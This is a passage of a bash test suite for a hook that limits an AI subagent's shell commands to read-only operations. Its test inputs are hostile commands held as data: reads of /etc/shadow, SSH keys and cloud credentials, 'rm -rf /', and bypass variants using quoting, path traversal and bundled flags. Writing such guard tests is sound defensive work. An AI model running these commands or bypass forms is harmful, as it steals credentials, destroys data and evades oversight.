  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat <(cat /etc/passwd)"}}' \
  "shell metacharacter"

run_case "cx: cd /tmp && cmd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cd /tmp && git status"}}' \
  "shell metacharacter"

# --- security: exfiltration via read-only verbs (NEW v3) ---
run_case "cx: cat /etc/shadow → deny (outside read root)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/shadow"}}' \
  "outside read roots"

run_case "cx: cat /etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/passwd"}}' \
  "outside read roots"

run_case "cx: cat ~/.ssh/id_rsa → deny (tilde rejected)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ~/.ssh/id_rsa"}}' \
  "tilde path"

run_case "cx: cat /home/example/.aws/credentials → deny (outside read root)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /home/example/.aws/credentials"}}' \
  "outside read roots"

run_case "cx: grep secret /home/example/.netrc → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep secret /home/example/.netrc"}}' \
  "outside read roots"

run_case "cx: ls /home/example/.config → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"ls /home/example/.config"}}' \
  "outside read roots"

# --- security: glob rejection ---
run_case "cx: cat * → deny (glob)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat *"}}' \
  "glob char in arg"

run_case "cx: cat /tmp/*.log → deny (glob)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/*.log"}}' \
  "glob char in arg"

run_case "cx: ls /home/?/.ssh → deny (?)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"ls /home/?/.ssh"}}' \
  "glob char in arg"

run_case "cx: cat /tmp/[abc]/x → deny ([)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/[abc]/x"}}' \
  "glob char in arg"

# --- security: destructive git ---
run_case "cx: git push → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
  "not in read-only allowlist"

run_case "cx: git push --force → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push --force"}}' \
  "not in read-only allowlist"

run_case "cx: git reset --hard → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git reset --hard"}}' \
  "not in read-only allowlist"

run_case "cx: git commit -am → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git commit -am msg"}}' \
  "not in read-only allowlist"

run_case "cx: git rebase main → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git rebase main"}}' \
  "not in read-only allowlist"

run_case "cx: git checkout main → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git checkout main"}}' \
  "not in read-only allowlist"

run_case "cx: git merge other → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git merge other"}}' \
  "not in read-only allowlist"

run_case "cx: git branch -D foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -D foo"}}' \
  "destructive/mutating flag"

run_case "cx: git branch -d foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -d foo"}}' \
  "destructive/mutating flag"

run_case "cx: git branch -a → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -a"}}'

run_case "cx: git branch --show-current → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch --show-current"}}'

# --- security: git stash subverbs (NEW v3) ---
run_case "cx: git stash list → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash list"}}'

run_case "cx: git stash show → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash show"}}'

run_case "cx: bare git stash → deny (mutating default)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash"}}' \
  "bare 'git stash' is mutating"

run_case "cx: git stash push → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash push -m foo"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash drop → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash drop"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash pop → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash pop"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash clear → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash clear"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash apply → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash apply"}}' \
  "stash subverb not in read-only allowlist"

# --- security: --output / --out-file flag rejection (NEW v3) ---
run_case "cx: git log --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git log --output=/tmp/x"}}' \
  "git write flag"

run_case "cx: git diff --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git diff --output=/tmp/x"}}' \
  "git write flag"

run_case "cx: git show --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git show --output=/tmp/x"}}' \
  "git write flag"

# --- security: unsupported git option forms (NEW v3) ---
run_case "cx: git -c key=val status → deny (unsupported form)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -c key=val status"}}' \
  "unsupported git form"

run_case "cx: git --git-dir=foo status → deny (unsupported form)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git --git-dir=/tmp/x status"}}' \
  "unsupported git form"

# --- security: dangerous binaries off allowlist ---
run_case "cx: find . -delete → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"find . -delete"}}' \
  "not in allowlist"

run_case "cx: find . -name foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"find . -name foo"}}' \
  "not in allowlist"

run_case "cx: bash -c → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"bash -c whatever"}}' \
  "not in allowlist"

run_case "cx: sed -i → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"sed -i s/a/b/ file"}}' \
  "not in allowlist"

run_case "cx: awk script → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"awk -f script.awk file"}}' \
  "not in allowlist"

run_case "cx: env FOO=x git status → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"env FOO=x git status"}}' \
  "not in allowlist"

run_case "cx: codex exec direct → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"codex exec foo"}}' \
  "not in allowlist"

# --- empty / malformed ---
run_case "cx: empty command → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":""}}' \
  "empty"

run_case "cx: malformed JSON → deny" 2 "$CXHOOK" \
  'not json' \
  "malformed JSON"

# --- type confusion ---
run_case "cx: agent_type as array → no-op" 0 "$CXHOOK" \
  '{"agent_type":["codex-executor"],"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: agent_type null → no-op" 0 "$CXHOOK" \
  '{"agent_type":null,"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

# --- no-op for non-target agents/tools ---
run_case "cx: critic Bash → no-op" 0 "$CXHOOK" \
  '{"agent_type":"critic","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: project-pm Bash → no-op (other guard)" 0 "$CXHOOK" \
  '{"agent_type":"project-pm","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: main thread (no agent_type) → no-op" 0 "$CXHOOK" \
  '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: codex-executor Read → no-op" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

# --- bypass env var ---
run_case_env "cx: bypass via CLAUDE_HOOK_CODEX_GUARD=off" 0 "CLAUDE_HOOK_CODEX_GUARD=off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case_env "cx: bypass=Off (case mismatch) does NOT bypass" 2 "CLAUDE_HOOK_CODEX_GUARD=Off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case_env "cx: bypass=empty does NOT bypass" 2 "CLAUDE_HOOK_CODEX_GUARD=" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

# --- audit-log content assertions ---
$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status"}}' | "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains allow line" "decision=allow"
# %q escapes spaces as backslash-space; assert the escaped form.
assert_log "cx: allow line records git command (escaped)" 'git\ status'

$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push --force"}}' | "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains deny line" "decision=deny"
assert_log "cx: deny line records command target (escaped)" 'git\ push\ --force'

$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; rm -rf /"}}' | "$CXHOOK" >/dev/null 2>&1
# Reason is also %q-escaped; the literal `shell` token survives unescaped.
assert_log "cx: deny reason includes 'shell metacharacter'" 'shell\ metacharacter'

$LIST || truncate_log
$LIST || printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status"}}' | env CLAUDE_HOOK_CODEX_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains bypass line with agent_type" "decision=bypass"
assert_log "cx: bypass line records codex-executor (not '?')" "agent=codex-executor"

# --- read-root override via env var ---
run_case_env "cx: cat /etc/x with /etc in read roots → allow" 0 "CLAUDE_HOOK_CODEX_READ_ROOTS=/etc" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/passwd"}}'

# --- v4: quoted-path bypass ---
run_case 'cx: cat "/etc/passwd" (double-quote) → deny' 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat \"/etc/passwd\""}}' \
  "double-quote"

run_case "cx: cat '/etc/passwd' (single-quote) → deny" 2 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cat '/etc/passwd'\"}}" \
  "single-quote"

run_case 'cx: grep "pattern" file (any double-quote) → deny' 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep \"pattern\" file"}}' \
  "double-quote"

# --- v4: relative `..` traversal bypass ---
run_case "cx: cat ../etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ../etc/passwd"}}' \
  "path traversal"

run_case "cx: cat ../../etc/shadow → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ../../etc/shadow"}}' \
  "path traversal"

run_case "cx: cat ./../etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ./../etc/passwd"}}' \
  "path traversal"

run_case "cx: cat foo/../bar → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat foo/../bar"}}' \
  "path traversal"

run_case "cx: legitimate filename foo..bar → allow (not path segment)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat foo..bar"}}'

# --- v4: git -C dir read-root validation ---
run_case "cx: git -C /etc status → deny (outside read roots)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /etc status"}}' \
  "git -C dir outside read roots"

run_case "cx: git -C /home/example/.ssh status → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /home/example/.ssh status"}}' \
  "git -C dir outside read roots"

run_case "cx: git -C /tmp/../etc status → deny (traversal normalizes)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp/../etc status"}}' \
  "path traversal"

run_case "cx: git -C ../foo status → deny (relative traversal)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C ../foo status"}}' \
  "path traversal"

# --- v4: --flag=PATH bypass ---
run_case "cx: grep --file=/etc/shadow x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: jq --slurpfile=/etc/passwd . → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq --slurpfile=/etc/passwd ."}}' \
  "outside read roots"

run_case "cx: cat --include=/tmp/foo file → allow (value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat --include=/tmp/foo file"}}'

run_case "cx: grep --file=~/.ssh/x file → deny (tilde in flag value)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=~/.ssh/x file"}}' \
  "tilde path"

run_case "cx: grep --file=/tmp/../etc/passwd → deny (traversal in flag value)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=/tmp/../etc/passwd file"}}' \
  "path traversal"

# --- v5: short-flag bypass (single-dash with =, bundled with attached path) ---
run_case "cx: grep -f=/etc/shadow x → deny (short flag with =)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f=/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep -f/etc/shadow x → deny (bundled short flag, abs path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep -f~/.ssh/id_rsa x → deny (bundled short flag, tilde)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f~/.ssh/id_rsa x"}}' \
  "tilde path"

run_case "cx: grep -f../etc/passwd x → deny (bundled short flag, traversal)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f../etc/passwd x"}}' \
  "path traversal"

run_case "cx: grep -f/tmp/foo x → allow (bundled short flag, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f/tmp/foo x"}}'

run_case "cx: grep -i pattern → allow (bare short flag, no value)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -i pattern file"}}'

run_case "cx: grep -iE pattern → allow (combined short flags, not path)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -iE pattern file"}}'

# --- v6: bundled-prefix short-flag bypass (-rf/etc/passwd) ---
run_case "cx: grep -rf/etc/passwd → deny (bundled prefix + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rf/etc/passwd /tmp/x"}}' \
  "outside read roots"

run_case "cx: grep -irf/etc/shadow → deny (multi-prefix + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -irf/etc/shadow /tmp/x"}}' \
  "outside read roots"

run_case "cx: grep -nf/etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -nf/etc/passwd /tmp/x"}}' \
  "outside read roots"

run_case "cx: jq -rf/etc/passwd → deny (filter from secret file)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq -rf/etc/passwd /tmp/in"}}' \
  "outside read roots"

run_case "cx: grep -rf~/.ssh/x → deny (bundled prefix + tilde)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rf~/.ssh/x /tmp/x"}}' \
  "tilde path"

run_case "cx: grep -rf../etc/passwd → deny (bundled prefix + traversal)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rf../etc/passwd /tmp/x"}}' \
  "path traversal"

run_case "cx: grep -rf/tmp/foo → allow (bundled prefix, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rf/tmp/foo /tmp/x"}}'

run_case "cx: grep -rfsomefile → allow (bundled prefix, no path shape)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rfsomefile /tmp/x"}}'

# --- v7: digit-prefix bundled bypass ---
run_case "cx: tail -n5/etc/passwd → deny (digit prefix + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -n5/etc/passwd"}}' \
  "outside read roots"

run_case "cx: head -c100/etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"head -c100/etc/passwd"}}' \
  "outside read roots"

run_case "cx: grep -A2/etc/passwd x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -A2/etc/passwd x"}}' \
  "outside read roots"

run_case "cx: tail -n5/tmp/foo → allow (digit prefix, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -n5/tmp/foo"}}'

run_case "cx: tail -n5 → allow (digit prefix, no path)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -n5 file"}}'

# --- v8: digit-only short flag (legacy obsolete `tail -N` form) ---
run_case "cx: tail -5/etc/passwd → deny (digit-only entry + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -5/etc/passwd"}}' \
  "outside read roots"

run_case "cx: head -5/etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"head -5/etc/passwd"}}' \
  "outside read roots"

run_case "cx: tail -15/etc/passwd → deny (multi-digit entry + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -15/etc/passwd"}}' \
  "outside read roots"

run_case "cx: tail -5/tmp/foo → allow (digit-only entry, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -5/tmp/foo"}}'

run_case "cx: tail -5 file → allow (digit-only flag, no path)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -5 file"}}'

# --- v5: --flag VALUE space form (positional validation on next iter) ---
run_case "cx: grep --file /etc/shadow x → deny (space form; value as positional)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file /etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep --file /tmp/foo x → allow (space form; value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file /tmp/foo x"}}'

# Mutation-sensitive: distinguishes branch flag-gate (not the array entry).
run_case "cx: git branch -d foo → deny (gate enforces destructive flag)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -d foo"}}' \
  "destructive/mutating flag"

# --- v4: dead-code regression (stash/branch removed from array) ---
# These would silently pass if the per-subcmd gates were also removed;
# combined with the explicit deny tests above, mutation testing is now strict.
run_case "cx: git status (still allowed via array)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status --short"}}'

run_case "cx: git branch -a (only branch gate sets allowed=1 now)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -a"}}'

run_case "cx: git stash list (only stash gate sets allowed=1 now)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash list"}}'

# --- run_in_background:true deny path ---------------------------------------
# The hook denies `run_in_background:true` because backgrounding the
# codex-dispatch.sh call from inside the codex-executor subagent orphans the
# codex job (subagent process dies when its Bash returns; harness SIGKILLs the
# orphaned background command). See codex-executor.md §Dispatch.
#
# The harness payload shape for the `run_in_background` flag is undocumented;
# the hook hedges across three plausible JSON paths. EVERY path must have a
# regression test — a prior single-path fix shipped without tests was bypassed
# in production (see DEBUG comment in hook-codex-bash-guard.sh).

# Path 1 of 3: nested under tool_input.
run_case "cx: run_in_background:true in tool_input → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":true}}' \
  "run_in_background:true forbidden"

# Path 2 of 3: top-level envelope sibling of tool_input.
run_case "cx: run_in_background:true at top level → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","run_in_background":true,"tool_input":{"command":"git status"}}' \
  "run_in_background:true forbidden"

# Path 3 of 3: nested under tool_options.
run_case "cx: run_in_background:true in tool_options → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_options":{"run_in_background":true},"tool_input":{"command":"git status"}}' \
  "run_in_background:true forbidden"

# Allow: explicit false should never trigger the deny.
run_case "cx: run_in_background:false in tool_input → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":false}}'

# Allow: field absent (the common case) should never trigger the deny.
run_case "cx: run_in_background field absent → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status"}}'

# Bypass: CLAUDE_HOOK_CODEX_GUARD=off must skip the new check (consistent with
# the bypass behaviour for all other guard checks in this hook).
run_case_env "cx: bypass CLAUDE_HOOK_CODEX_GUARD=off with run_in_background:true → allow" 0 \
  "CLAUDE_HOOK_CODEX_GUARD=off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":true}}'

# Narrowness: only an exact boolean true (jq -r "true") triggers — string "yes",
# numeric 1, mixed-case "TRUE" are NOT denied. Documents the intentional
# scope of the check; a future widening would require an explicit decision.
run_case "cx: run_in_background:\"yes\" (string) → allow (only boolean true denied)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":"yes"}}'

run_case "cx: run_in_background:1 (numeric) → allow (only boolean true denied)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":1}}'

# Negative: non-codex-executor agents are unaffected by the run_in_background
# check (and indeed by the entire hook — it no-ops for other agent types).
run_case "cx: main thread (no agent_type) with run_in_background:true → no-op allow" 0 "$CXHOOK" \
  '{"tool_name":"Bash","tool_input":{"command":"git status","run_in_background":true}}'

# =============================================================================
# hook-tool-trace
# =============================================================================

echo
$LIST || echo "== hook-tool-trace =="

tool_trace_run() {
  local payload="$1" trace_dir="$2" stdout_file="$3" stderr_file="$4"
  printf '%s' "$payload" | CLAUDE_TOOL_TRACE_DIR="$trace_dir" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$TRACE_HOOK" >"$stdout_file" 2>"$stderr_file"
}

tool_trace_record() {
  local trace_dir="$1"
  tail -n 1 "$trace_dir/tool-trace.jsonl" 2>/dev/null
}

tool_trace_assert_field() {
  local json="$1" filter="$2"
  printf '%s\n' "$json" | jq -e "$filter" >/dev/null 2>&1
}

tool_trace_case() {
  local name="$1" payload="$2" jq_filter="$3" forbidden_regex="${4:-}"
  should_run "$name" || return 0
  local trace_dir out err status line no_forbidden
  trace_dir="$(mktemp -d "$CLAUDE_HOOK_LOG_DIR/tool-trace.XXXXXX")"
  out="$(mktemp)"
  err="$(mktemp)"
  tool_trace_run "$payload" "$trace_dir" "$out" "$err"
  status=$?
  line="$(tool_trace_record "$trace_dir")"
  no_forbidden=1
  if [[ -n "$forbidden_regex" && "$line" =~ $forbidden_regex ]]; then
    no_forbidden=0
  fi
  if [[ "$status" == "0" && ! -s "$out" && ! -s "$err" && -n "$line" && "$no_forbidden" == "1" ]] && tool_trace_assert_field "$line" "$jq_filter"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s stdout=%q stderr=%q line=%q\n' "$name" "$status" "$(cat "$out")" "$(cat "$err")" "$line"
  fi
  rm -f "$out" "$err"
}

# Behavior: Bash command beginning with a safe lowercase command records that token only.
# Steps: 1. Run the trace hook with a Bash payload; 2. Assert the JSONL first_arg_or_skill field is the command token.
tool_trace_case "tool-trace/happy_path_bash" \
  "{\"cwd\":\"$REPO_ROOT\",\"session_id\":\"s-bash\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls -la\"}}" \
  '.tool == "Bash" and .first_arg_or_skill == "ls" and .session_id == "s-bash" and has("cwd") == false'

# Behavior: Read tool with file_path inside cwd records a cwd-relative path.
# Steps: 1. Run the trace hook with a Read payload under cwd; 2. Assert only the repo-relative path is logged.
tool_trace_case "tool-trace/happy_path_read" \
  "{\"cwd\":\"$REPO_ROOT\",\"session_id\":\"s-read\",\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$REPO_ROOT/BACKLOG.md\"}}" \
  '.tool == "Read" and .first_arg_or_skill == "BACKLOG.md"'

# Behavior: Agent tool records the enum-like subagent_type as first_arg_or_skill.
# Steps: 1. Run the trace hook with an Agent payload; 2. Assert subagent_type is logged.
tool_trace_case "tool-trace/happy_path_agent" \
  "{\"cwd\":\"$REPO_ROOT\",\"session_id\":\"s-agent\",\"tool_name\":\"Agent\",\"tool_input\":{\"subagent_type\":\"qa-tester\"}}" \
  '.tool == "Agent" and .first_arg_or_skill == "qa-tester"'

# Behavior: Grep tool invocations redact patterns while preserving tool_name extraction.
# Steps: 1. Run the trace hook with tool_name and tool_input fields; 2. Assert tool is Grep and first_arg_or_skill is null.
tool_trace_case "tool-trace/tool_name_hedge_a" \
  "{\"cwd\":\"$REPO_ROOT\",\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"needle\"}}" \
  '.tool == "Grep" and .first_arg_or_skill == null' \
  'needle'

# Behavior: Bash tool can be extracted from the legacy tool field and command from params.
# Steps: 1. Run the trace hook with tool and params fields; 2. Assert the hedged fields are parsed.
tool_trace_case "tool-trace/tool_name_hedge_b" \
  "{\"cwd\":\"$REPO_ROOT\",\"tool\":\"Bash\",\"params\":{\"command\":\"pwd -P\"}}" \
  '.tool == "Bash" and .first_arg_or_skill == "pwd"'

# Behavior: Missing tool name falls back to "?" and does not infer first_arg_or_skill.
# Steps: 1. Run the trace hook without tool_name/tool fields; 2. Assert unknown tool and null first_arg_or_skill.
tool_trace_case "tool-trace/tool_name_missing" \
  "{\"cwd\":\"$REPO_ROOT\",\"tool_input\":{\"command\":\"ls -la\"}}" \
  '.tool == "?" and .first_arg_or_skill == null'

# Behavior: Bash command beginning with env-assignment first token redacts first_arg_or_skill.
# Steps: 1. Run Bash with TOKEN= prefix; 2. Assert first_arg_or_skill is null and secret substrings are absent.
tool_trace_case "tool-trace/bash_env_prefix_redacted" \
